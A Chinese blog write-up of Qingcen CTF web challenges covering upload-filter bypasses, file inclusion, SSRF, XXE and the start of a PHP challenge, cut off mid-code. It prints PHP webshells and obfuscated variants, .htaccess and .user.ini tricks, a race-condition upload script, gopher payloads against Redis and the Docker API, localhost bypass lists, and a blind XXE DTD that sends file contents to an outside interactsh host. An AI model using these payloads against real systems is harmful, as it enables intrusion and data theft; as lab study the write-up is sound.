---
title: 青岑CTF有关WEB的WP（三）
description: 匆忙上的青岑CTF第三部分
date: 2026-04-26 19:51:01
updated: 2026-04-26 19:51:01
image: https://img.yanxisishi.top/images/2026/04/20260426203814880.png
categories: [CTF]
tags: [CTF, WP]

---

## EZREQUEST_1

本系统仅允许通过安全通道访问，请使用指定方式发起请求并完成验证。
使用 GET 方式提交参数 a 的值为 a 的请求开启验证。

```http
?a=a
```

请使用 POST 方式提交请求，且参数 b 的值为 b。

```http
POST: b=b
```

您的 IP 不在白名单内，请从本地或受信任网络发起请求。

```http
X-Forwarded-For: 127.0.0.1
```

请使用公司内部浏览器 QingcenSafe 访问。

```http
User-Agent: QingcenSafe
```

请使用指定代理 xujinyingcangming.top 访问。

```http
Via: xujinyingcangming.top
```

请使用 admin 账号登录后再试。

```http
Cookie: user=admin
```

## EZFU

上传一句话木马 shell.php ：

```php
<?php eval($_POST[1]);?>  
```

回显：

```txt
File uploaded successfully
uploads/7e653c56-6d5c-4a26-badc-ab7a0d8227f7.php
```

访问 `/uploads/7e653c56-6d5c-4a26-badc-ab7a0d8227f7.php` ，POST 传入 ：

```http
1=phpinfo();
```

## EZFU_1

上传文件的时候找不到 shell.php ，应该是前端过滤了文件类型，查看源码找到：

```html
<input type="file" name="image" id="image" accept="image/jpeg,image/jpg,image/png,image/gif,image/webp" required>
```

和

```js
// 前端防护：文件类型和大小检查
function validateFile(file) {
// 检查文件类型（只允许图片）
const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp'];
if (!allowedTypes.includes(file.type)) {
alert('只允许上传图片文件！(jpg, png, gif, webp)');
return false;
}

// 检查文件扩展名
const fileName = file.name.toLowerCase();
const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
const hasValidExtension = allowedExtensions.some(ext => fileName.endsWith(ext));
if (!hasValidExtension) {
alert('文件扩展名不被允许！只允许: .jpg, .jpeg, .png, .gif, .webp');
return false;
}

// 检查文件大小（最大 5MB）
const maxSize = 5 * 1024 * 1024; // 5MB
if (file.size > maxSize) {
alert('文件大小超过限制！最大允许 5MB');
return false;
}

// 检查文件名中是否包含危险字符
const dangerousKeywords = ['php', 'shell', 'cmd', 'exec', 'system', 'eval'];
for (let keyword of dangerousKeywords) {
if (fileName.includes(keyword)) {
alert('文件名包含不允许的关键字！');
return false;
}
}

return true;
}
```

1. 修改前端源码：

   打开 F12 ，把刚刚的 `accept="image/jpeg,image/jpg,image/png,image/gif,image/webp"` 删掉，同时禁用 JS

   然后再上传 shell.php ，回显：

   ```txt
   {"success":true,"file_url":"uploads\/fe95dfde-86b1-4514-808f-df8f41c65e1a.php","message":"File uploaded successfully"}
   ```

   访问 `/uploads/fe95dfde-86b1-4514-808f-df8f41c65e1a.php` ，POST 传入 ：

   ```http
   1=phpinfo();
   ```

2. 在 bp 中修改文件绕过前端：

   把 shell.php 重命名为 1.png ，上传文件的同时用 bp 抓包，然后把文件名从 1.png 改成 1.php 即可

   ![image-20260423131529950](https://img.yanxisishi.top/images/2026/04/image-20260423131529950.png)

   访问 `/uploads/f014c490-2846-4be7-9f58-a4d6e3c14a34.php` ，POST 传入 ：

   ```http
   1=phpinfo();
   ```

##   EZFU_2

上传 shell.php ，返回：

```txt
{"success":false,"message":"File type not allowed"}
```

说明依旧限制文件类型。

上传刚刚的 1.png ，返回：

```txt
{"success":false,"message":"File content not allowed"}
```

说明这次过滤了文件内容。

上传 1.png 并用 bp 抓包，把文件名从 1.png 改成 1.php 后还是显示 `File type not allowed` 。

发送到 Intruder，然后爆破后缀名：

```txt
phtml
php
php3
php4
php5
php7
php8
pht
phtm
phar
```

![image-20260423134939456](https://img.yanxisishi.top/images/2026/04/image-20260423134939456.png)

也是看到演都不演了，后缀名是 html 的时候，连内容都不过滤了，直接上传成功。

访问 `/uploads/b87e1dbc-05e2-4e31-895d-b9405f0d8871.phtml` ，POST 传入 ：

```http
1=phpinfo();
```

##   EZFU_3

依旧上传 1.png ，返回：

```txt
File header validation failed（文件头验证失败）
```

说明本题要给文件内容加上文件头才能绕过，最简单的就是加 GIF 头，把上传文件内容改为：

```php
GIF89a
<?php eval($_POST[1]);?>  
```

重发后返回路径，接着再次测试可用后缀名，发现依旧是 1.phtml 。

![image-20260423221526360](https://img.yanxisishi.top/images/2026/04/image-20260423221526360.png)

访问 `/uploads/7a787541-82ee-43ec-9b26-44d8d5548c54.phtml` ，POST 传入 ：

```http
1=phpinfo();
```

## EZFU_4

依旧上传上一题的解，返回：

```txt
File content not allowed: PHP tags detected
```

说明本题又过滤了文件内容，经测试文件内容中不能出现 `<?php` ，直接用短标签 `<?` 绕过（需目标环境开启 `short_open_tag`）：

```php
GIF89a
<?= eval($_POST[1]);?>  
```

但是注意到本题的 PHP 环境为 PHP/5.6.40 ，在 PHP 7.0 版本被移除之前，PHP 默认支持使用类似 JavaScript 的 HTML 标签语法来包裹 PHP 代码。真正的预期解其实是：

```php
GIF89a
<script language="php">
    eval($_POST[1]);
</script>
```

## EZFU_5

PHP 版本调回 PHP/8.2.30 ，接着用短标签：

```php
GIF89a
<?= eval($_POST[1]);?>  
```

## EZFU_6

接着用上题的 payload ，返回：

```txt
File content not allowed: dangerous function detected
```

看来又过滤了别的关键词，经测试发现过滤了很多危险函数，可以用拼接函数替代：

```php
GIF89a
<?= ('sys'.'tem')($_POST[1]); ?>
```

根据回显访问到页面后 POST 传入 `1=env` 。

（**注：** 不要拼接 `eval` ， **`eval`** 以及 PHP 8 中的 `assert`、`echo`、`include` 等属于**语言结构**，是 PHP 解析器的一部分，不是函数。PHP 引擎不支持动态调用语言结构。）

或者用反引号绕过：

```php
GIF89a
<?= `$_POST[1]`; ?>
```

`<?=` 实际上等效于 `<?php echo` ，根据回显访问到页面后 POST 传入 `1=env` 。

## EZFU_7

接着用上题的解，返回：

```txt
File type not allowed
```

看来是 html 也用不了了，看来得利用配置文件了，注意到当前服务器环境是 Apache ，尝试上传 .htaccess 文件：

```htaccess
AddType application/x-httpd-php .png
```

![image-20260424112119836](https://img.yanxisishi.top/images/2026/04/image-20260424112119836.png)

然后上传 1.png ：

```php
<?= `$_POST[1]`; ?>
```

![image-20260424112244872](https://img.yanxisishi.top/images/2026/04/image-20260424112244872.png)

接着访问 `/uploads/1.png` ，POST 传入 `1=env` 。

## EZFU_8

用上题的解法，上传后没什么问题，但是访问 `/uploads/1.png` ，发现 .htaccess 失效了。

可以用 .user.ini 替代 .htaccess ，先上传 1.png ：

```php
<?= `$_POST[1]`; ?>
```

然后上传 .user.ini ：

```ini
auto_prepend_file=1.png
```

接着访问 `/uploads/index.php` ，POST 传入 `1=env` 。

也可以接着通过上传 .hatccess 做这题， `AddType application/x-httpd-php .png` 失效是因为 AddType 只会改 Content-Type，不会执行 PHP ，可以上传 .htaccess ：

```htaccess
SetEnv PHP_VALUE "auto_prepend_file=1.png"
```

接着访问 `/uploads/index.php` ，POST 传入 `1=env` 。

## EZFU_9

进入员工入口，提示 `资料仍在 /etc 目录归档` 。点击 `查看公告` 后发现 URL 中新增 `?doc=notice.txt` ，意识到可能存在目录穿越。

传入 `?doc=../../../../../etc/passwd` ，得到 `admin:x:1001:1001:pass=LnmnHAEZeHSk:/nonexistent:/usr/sbin/nologin` 。

根据账号密码登录进入，页面显示 `请上传旧系统的 .bz2 格式备份包进行数据恢复：` 。

先制作 `.bz2` 后缀的一句话木马：

```bash
cat > shell.php <<'EOF'
<?php eval($_POST[1]);?>  
EOF

bzip2 -c shell.php > shell.php.bz2
```

得到 shell.php.bz2 ，然后上传。接着访问 `/uploads/shell.php` ，POST 传入 `1=phpionfo();` 。

## EZFU_10

这次没给密码提示，盲猜弱密码，放 bp 里爆破得出密码是 `123456` 。

再上传上题的解，返回：

```txt
文件名中不允许出现 php
```

用 bp 抓包，爆破文件名 `shell.php.bz2` 中的 `php` ，最后得出来发现又是 `shell.phtml.bz2` 可以成功上传。

题目中也提示 `注意：上传的文件将使用include()解压恢复` ，那么接下来重新制作一个 `shell.phtml.bz2` ：

```bash
cat > shell.php <<'EOF'
<?php phpinfo(); ?>
EOF

bzip2 -c shell.php > shell.phtml.bz2
```

上传 `shell.phtml.bz2` 即可。

## EZFU_11

依旧先上传一句马 shell.php ，发现没有限制直接上传了，但是根据回显路径访问却是 404 。看来这题会迅速清理进程，文件会很快被删。

可以通过 bp 无限发包，让系统删不完就行了：

1. 上传 1.php ：

   ```php
   <?php system('cat /flag');?>
   ```

   同时用 bp 抓包。

2. 发送到 Intruder ，Payload 类型选择 Null payloads ，payload 配置选择无限重复，点击开始攻击。

   ![image-20260424131304948](https://img.yanxisishi.top/images/2026/04/image-20260424131304948.png)

3. 访问 `/uploads/1.php` ，得到 flag 。

## EZFU_12

依旧先上传一句马 shell.php ，但是这次发现回显路径是 `/uploads/f2afe3bf-fdf3-418e-a251-8620ba57fd99.php` ，很明显上传后的文件名变成了随机的 UUID 。

人类已经反应不过来了，速度跟不上的，只能写 Python 脚本（AI 生成的）：

```python
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://docker.qingcen.net:44047"
PAYLOAD = b"<?php system('cat /flag');?>"
STOP = threading.Event()

def worker():
    with requests.Session() as s:
        while not STOP.is_set():
            try:
                r = s.post(
                    f"{BASE_URL}/",
                    files={"image": ("shell.php", PAYLOAD, "application/x-php")},
                    timeout=3,
                )
                path = r.json().get("file_url")
                if not path:
                    continue

                text = s.get(f"{BASE_URL}/{path.lstrip('/')}", timeout=3).text.strip()
                if text.startswith("flag{") and text.endswith("}"):
                    STOP.set()
                    return text
            except (requests.RequestException, ValueError):
                pass

def main():
    with ThreadPoolExecutor(max_workers=20) as pool:
        futures = [pool.submit(worker) for _ in range(20)]
        for f in as_completed(futures):
            flag = f.result()
            if flag:
                print(flag)
                return

if __name__ == "__main__":
    main()
```

或者使用 Burp 的扩展插件 Turbo Intruder：



## EZFL

进去后随便点个左边的列表，发现 URL 中多了个 `?file=pages/faq.php` ，结合该题是文件包含，先试试 data 伪协议：

```http
?file=data:,<?php system('ls /')?>
```

找到 flag.txt ，再传入：

```http
?file=data:,<?php system('cat /flag.txt')?>
```

## EZFL_1

传入：

```http
?file=data:,<?php system('ls')?>
```

```http
?file=data:,<?php system('tac flag.php')?>
```

## EZFL_2

还是传入：

```http
?file=data:,<?php system('tac flag.php')?>
```

## EZFL_3

传入：

```http
?file=data:,<?php system('ls /')?>
```

```http
?file=data:,<?php system('nl /flag-r66A6J0enB7hTvWMbDHisiOZGtpmne.txt')?>
```

## EZFL_4

传入：

```http
?file=data:,<?php system('ls')?>
```

返回 `php not allowed` ，说明过滤了 php，可以用大小写绕过：

```http
?file=data:,<?pHp system('ls')?>
```

```http
?file=data:,<?pHp system('tac f*')?>
```

## EZFL_5

传入：

```http
?file=data:,<?pHp system('ls')?>
```

返回 `data not allowed` ，说明过滤了 data ，

换一个伪协议做：

```http
?file=PHP://input
POST: <?php system("tac flag.php");?>
```

要用 bp 传，网上说是 hackbar 的问题。

## EZFL_6

这次大小写也绕不过 PHP 了，可以用日志注入：

```http
?file=/var/log/nginx/access.log
User-Agent: <?php eval($_POST[1]);?>
```

然后用蚁剑连接或者用 $_POST[1] 进行 RCE 什么的都可以。

但是这么简单结束文件包含也不合适，这里介绍另一种方法 —— **利用 `PHP_SESSION_UPLOAD_PROGRESS` 配合并发请求进行条件竞争** ：

1. 准备上传表单：

   创建 `exp.html` ：

   ```html
   <!DOCTYPE html>
   <html>
   <body>
       <form action="http://docker.qingcen.net:44232/" method="POST" enctype="multipart/form-data">
           
           <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('cat /flag.txt'); ?>" />
           
           <input type="file" name="file" />
           
           <input type="submit" value="开始上传" />
       </form>
   </body>
   </html>
   ```

2. 发起“写”请求竞争：

   这个步骤的目的是让服务器不断生成包含恶意代码的临时 Session 文件。

   1. 在浏览器中打开刚才写好的 `exp.html`，随意上传一个文件并用 bp 抓包。

   2. 在请求头中添加或修改 Cookie 字段，指定一个固定的 Session ID（例如 `abc`）：

      ```
      Cookie: PHPSESSID=abc
      ```

      然后将这个修改后的数据包发送到 Intruder 。

   3. Intruder 配置：

      选择 Null payloads 、无限重复、最大并发请求数设置为 30 左右。

3. 发起“读”请求竞争：

   这个步骤的目的是利用目标网站的 LFI 漏洞（即 `?file=` 参数），在临时文件被服务器删除前，抢先包含并执行它。

   1. 抓包原网页，将请求路径修改为包含临时文件的路径（Linux 下默认路径为 `/tmp/sess_` 加上刚才指定的 PHPSESSID）。

      ```http
      GET /?file=/tmp/sess_abc HTTP/1.1
      Host: docker.qingcen.net:44232
      ```

      然后将这个 GET 请求同样发送到 Intruder 。

   2. Intruder 配置：

      选择 Null payloads 、无限重复、最大并发请求数设置为 80 左右。

4. 并发执行与获取结果：

   30 个线程在不断往 `/tmp/sess_abc` 写恶意代码，80 个线程在不断尝试读取 `/tmp/sess_abc`。

   主要去看**发起“读”请求竞争**的攻击面板，筛选长度找到 flag 。

   ![image-20260424211640505](https://img.yanxisishi.top/images/2026/04/image-20260424211640505.png)

按理来说这个条件竞争的做法能把整个 EZFL 全解了，我懒得试了，只确定 EZFL_5 和 EZFL_6 可以做，欸嘿。

## EZSSRF

查看源码发现提示：

```html
<!-- vip用户专用端口在8888~9999之间 -->
```

输入 `http://127.0.0.1:8888` 并用 bp 抓包，发到 Intruder ，爆破 `8888` ，范围为 8888~9999 。

筛选长度找到只有 9001 有效，输入 `http://127.0.0.1:9001` 后返回：

```txt
欢迎您，尊敬的vip用户。现在您可以访问管理员admin面板
```

输入 `http://127.0.0.1:9001/admin` 后返回：

```txt
Internal Admin Panel
Available: /admin/flag
```

输入 `http://127.0.0.1:9001/admin/flag` 后得到 flag 。

关于 `url=http://127.0.0.1/flag.php` 的变体：

1. 基础形式

   - **标准IP**: `url=http://127.0.0.1/flag.php`
   - **本地主机名**: `url=http://localhost/flag.php`
   - **File协议读取**: `url=file:///var/www/html/flag.php`

2. 进制转换绕过

   将IP地址的全部或部分转换为不同的进制以绕过正则匹配：

   - **8进制**:
     - `url=http://0177.0.0.1/flag.php`
     - `url=http://017700000001/flag.php`
   - **16进制**:
     - `url=http://0x7f.0.0.1/flag.php`
     - `url=http://0x7f000001/flag.php`
   - **10进制整数**:
     - `url=http://2130706433/flag.php`

3. 地址简写与特殊IP

   利用系统解析IP时的特性进行缩写或替换：

   - **简写地址**: `url=http://127.1/flag.php`
   - **特殊0地址**:
     - `url=http://0/flag.php`
     - `url=http://0.0.0.0/flag.php`

4. 域名解析绕过

   利用已公开的、会默认解析到 `127.0.0.1` 的真实域名：

   - `url=http://sudo.cc/flag.php`
   - `url=http://safe.taobao.com/flag.php`
   - `url=http://wifi.aliyun.com/flag.php`
   - `url=http://ecd.tencent.com/flag.php`

5. 协议认证与参数拼接绕过

   利用URL解析特性（如 `user@host`）及锚点/参数后缀绕过前后缀限制：

   - **带后缀的@符号绕过**:
     - `url=http://ctf.@127.0.0.1/flag.php#show`
     - `url=http://ctf.@127.0.0.1/flag.php?show`

6. 服务器端与DNS技巧

   通过配置外部服务器将请求引导回本地：

   - **302跳转**: `url=http://【vpsip】:8000/302.php` *(注：VPS上的302.php内容为 `header("Location: http://127.0.0.1/flag.php");`)*
   - **DNS重绑定**: `url=http://【vpsip的十六进制】.7f000001.rbndr.us/flag.php`

## EZSSRF_1

输入上一题的 `http://127.0.0.1:9001/admin/flag` 返回：

```txt
Blocked IP
```

改成输入 `http://127.1:9001/admin/flag` 返回 flag 。

## EZSSRF_2

输入上一题的 `http://127.1:9001/admin/flag` 返回：

```txt
Loopback range blocked（回环范围被阻止）
```

改成输入 `http://2130706433:9001/admin/flag` 返回：

```txt
Integer IP not allowed（不允许使用整数 IP 地址）
```

改成输入 `http://0x7f.0.0.1:9001/admin/flag` 返回 flag 。

## EZSSRF_3

查看源码，提示：

```html
<!--  flag在/flag.txt里  -->
```

输入 `file:///flag.txt` 返回 flag 。

## EZSSRF_4

点击 Start Uploading 进入 SSRF 的注入点，先确认能否使用 `file://` 任意读取，输入 `file:///etc/passwd` 后发现返回的是一张图片，查看图片位置所在源码：

```txt
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=
```

Base64 解码得到：

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

证明确实存在 `file://` 任意读取。

接下来读取当前目录有什么文件，输入 `file:///var/www/html/` 返回：

```txt
styles.css
template.html
index.php
flag.php
```

找到 flag 所在文件，输入 `file:///var/www/html/flag.php` 返回：

```php
<?php
error_reporting(0);

$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$allowed_ips = ['127.0.0.1', 'localhost'];

if (!in_array($client_ip, $allowed_ips)) {
    http_response_code(403);
    echo json_encode(['error' => 'Access denied']);
    exit;
}

class ImageProcessor {
    private $flag = null;
    
    public function __construct() {
        $this->flag = getenv('FLAG');
    }
    
    public function getFlag() {
        return $this->flag;
    }
}

$processor = new ImageProcessor();

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: text/plain; charset=utf-8');
    echo file_get_contents(__FILE__);
    exit;
}

$response = ['status' => 'error', 'message' => 'Invalid request'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    if (isset($data['action'])) {
        switch ($data['action']) {
            case 'get_flag':
                $response = [
                    'status' => 'success',
                    'flag' => $processor->getFlag()
                ];
                break;
                
            default:
                $response = ['error' => 'Unknown action'];
        }
    }
}

header('Content-Type: application/json');
echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
?>
```

根据读取到的 `flag.php` 源码，获取 flag 需要满足三个条件：

1. 请求来源 IP 必须是 `127.0.0.1` 或 `localhost`（SSRF 已经满足）。
2. 请求方法必须是 `POST`。
3. POST 请求的 Body 必须是 JSON 格式的数据：`{"action":"get_flag"}`。

先构造一个标准的 HTTP POST 请求报文：

```http
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 21

{"action":"get_flag"}
```

将上述 HTTP 请求转化为 gopher 协议的格式：`gopher://127.0.0.1:80/_<URL编码后的数据>`。

输入：

```txt
gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/json%0D%0AContent-Length%3A%2021%0D%0A%0D%0A%7B%22action%22%3A%22get_flag%22%7D
```

**注意：** 把换行替换为 `%0D%0A` 才可以，不能是单纯的 `%0A` 。

返回：

```txt
HTTP/1.1 200 OK
Date: Fri, 24 Apr 2026 14:32:16 GMT
Server: Apache/2.4.66 (Debian)
X-Powered-By: PHP/8.2.30
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Length: 85
Content-Type: application/json

{
    "status": "success",
    "flag": "flag{c8b47325-a08a-4119-8a0d-631e856875af}"
}
```

## EZSSRF_5

源码提示：

```html
<!-- 内网依赖：Docker API 127.0.0.1:2375（运维文档） -->
```

1. 获取容器信息

   **URL** : `http://127.0.0.1:2375/containers/json`

   **Method** : `GET`

   **Request Body** : （留空）

   返回：

   ```ttx
   [{"Id":"7b9c9a3917714842fc51928a4982e780bd7dae60b450dcf37e2bf5354b745e95","Names":["\/ctf_container"],"Image":"ubuntu:latest","ImageID":"sha256:4dd4cea3fe879b8f8c0d662114616af434fddb9691e3cd8d57e2210ef3123a4c","Command":"\/bin\/bash","Created":1777038406,"State":"running","Status":"Up 1 hour","Ports":[],"Labels":[],"SizeRw":0,"SizeRootFs":77808128,"HostConfig":{"NetworkMode":"bridge"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"bridge","EndpointID":"4d91f449e7eb8a8557e928c11239621b","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02"}}},"Mounts":[]}]
   ```

   得到容器（名为 `/ctf_container`） ID 为 `7b9c9a3917714842fc51928a4982e780bd7dae60b450dcf37e2bf5354b745e95` 。

2. 创建 Exec 实例

   **URL** : `http://127.0.0.1:2375/containers/7b9c9a3917714842fc51928a4982e780bd7dae60b450dcf37e2bf5354b745e95/exec`

   **Method** : `POST`

   **Request Body** :

   ```json
   {
     "AttachStdin": false,
     "AttachStdout": true,
     "AttachStderr": true,
     "Cmd": ["ls","/"],
     "Tty": false
   }
   ```

   得到新 ID 为 `execc942f54c549eae31fcdfb9e0c3b7d60f` 。

3. 启动 Exec 实例并获取回显

   **URL** : `http://127.0.0.1:2375/exec/execc942f54c549eae31fcdfb9e0c3b7d60f/start` 

   **Method** : `POST`

   **Request Body** :

   ```json
   {
     "Detach": false,
     "Tty": false
   }
   ```

   返回：

   ```txt
   bin
   boot
   dev
   entrypoint.sh
   etc
   flag_is_not_here.txt
   home
   lib
   lib64
   media
   mnt
   opt
   proc
   root
   run
   sbin
   srv
   sys
   tmp
   usr
   var
   ```

4. 创建新的 Exec 实例拿 flag

   **URL** : `http://127.0.0.1:2375/containers/7b9c9a3917714842fc51928a4982e780bd7dae60b450dcf37e2bf5354b745e95/exec`

   **Method** : `POST`

   **Request Body** :

   ```json
   {
     "AttachStdin": false,
     "AttachStdout": true,
     "AttachStderr": true,
     "Cmd": ["cat","/flag_is_not_here.txt"],
     "Tty": false
   }
   ```

   得到新 ID 为 `execc942f54c549eae31fcdfb9e0c3b7d60f` 。

   **URL** : `http://127.0.0.1:2375/exec/execc942f54c549eae31fcdfb9e0c3b7d60f/start` 

   **Method** : `POST`

   **Request Body** :

   ```json
   {
     "Detach": false,
     "Tty": false
   }
   ```

   返回 flag 。

## EZSSRF_6

源码啥提示没有，愉快的扫目录好了，扫到了 `/config.bak` 和 `/robots.txt` 。

访问 `/config.bak` 下载是：

```txt
redis-cli -h 127.0.0.1 -p 6379 SET flag "$FLAG" >/dev/null
```

所以用 gopher 打本地 Redis（127.0.0.1:6379）执行 GET flag 即可。

明文：

```txt
*2\r\n
$3\r\n
GET\r\n
$4\r\n
flag\r\n
*1\r\n
$4\r\n
QUIT\r\n
```

payload ：

```txt
gopher://127.0.0.1:6379/_*2%0d%0a$3%0d%0aGET%0d%0a$4%0d%0aflag%0d%0a*1%0d%0a$4%0d%0aQUIT%0d%0a
```

## EZXXE

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE aaa[
    <!ENTITY xxe SYSTEM "file:///flag"> 
]>
<aaa>
    <bbb>&xxe;</bbb>
</aaa>
```

## EZXXE_1

SVG（可缩放矢量图形）本质上是XML格式的文件。上传 1.svg ：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
    
    <text x="10" y="30" font-size="16">Text: &xxe;</text>
    
    <text x="10" y="60" font-size="16">
        Tspan: <tspan fill="red">&xxe;</tspan>
    </text>
    
    <foreignObject x="10" y="90" width="480" height="200">
        <html xmlns="http://www.w3.org/1999/xhtml">
            <body>
                <p>ForeignObject: &xxe;</p>
            </body>
        </html>
    </foreignObject>
    
    <title>Title: &xxe;</title>
    <desc>Desc: &xxe;</desc>
    
</svg>
```

这里因为不确定回显标签，把所有的都加上了，实际上后端也只回显了 `<desc>` 标签，如果只上传非 `<desc>` 标签的标签，会返回：

```txt
No description tag found.（未找到描述标签。）
```

## EZXXE_2

用上题的 payload ，返回：

```txt
Security violation: forbidden keyword detected.（安全违规：检测到禁用关键词。）
```

经测试过滤了 `file://` 、 `flag` 、 `expect://` ，可以利用 XML 的参数实体（`%`）结合 data 伪协议来进行 base64 编码绕过：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY % xixi SYSTEM "data:;base64,PCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9mbGFnIj4=">
    %xixi;
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
    <desc>&xxe;</desc>
</svg>
```

这个 payload 使用 `%` 定义一个参数实体 `xixi`，利用 `data:;base64,` 将原本包含关键词的完整实体声明语句（`<!ENTITY xxe SYSTEM "file:///flag">`）进行 base64 编码，随后通过调用 `%xixi;` ，**解析器会把刚才拿到的纯文本当作 DTD 语法的一部分再次解析**，等效于：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
    <desc>&xxe;</desc>
</svg>
```

**注意：** 不要试图用 data 伪协议去实现 RCE ，XML 解析器只负责“处理和格式化文本数据”，不会调用后端的 PHP 引擎，XXE 的核心能力是**任意文件读取**或 **SSRF（服务端请求伪造）**，无法直接执行系统命令。

## EZXXE_3

盲 XXE ，需要可访问的公网，这里用的是两个网站：

1. **[interactsh](!https://app.interactsh.com/) ：** 一款开源带外（OOB - Out-of-Band）交互收集服务器和客户端工具。
2. **[paste.rs](!https://paste.rs/) ：** 一个临时文本托管网站，用来把一段文本上传成公网可访问的链接。

这题条件好的也可以用 vps ，但是这两网站免费而且免登录，太香了。

先在命令行拿个 interactsh 域名：

```bash
# 下载
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# 运行
~/go/bin/interactsh-client -v
```

比如 `xxxx.oast.online` 。

创建 evil.dtd ：

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa "<!ENTITY &#x25; bbb SYSTEM 'http://interactsh域名/?x=%file;'>">
%aaa;
%bbb;
```

**注意：** 这里不要用 `file:///flag` ，用 `php://filter/read=convert.base64-encode/resource=/flag` 即可。

作用是：

```
读取 /flag
↓
base64 编码
↓
拼接到 http://你的域名/?x=base64内容
↓
让目标服务器访问这个 URL
```

接着用命令行上传：

```bash
curl --data-binary @evil.dtd https://paste.rs
```

返回类似 `https://paste.rs/abcd` 。

然后返回页面，发送 payload ：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aaa [
  <!ENTITY % remote SYSTEM "https://paste.rs/abcd">
  %remote;
]>
<aaa>1</aaa>
```

页面返回 OK 后，就可以回到命令行查看 interactsh 的状态，应该会出现 flag 的 base64 的值。

## EZPHP

```php
<?php
show_source(__FILE__);
include("flag.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a and $a==0){
    if(is_numeric($b)){
        exit("nono");
    }else{
        if($b>2026){
            echo $flag;
        }
    }
}else{
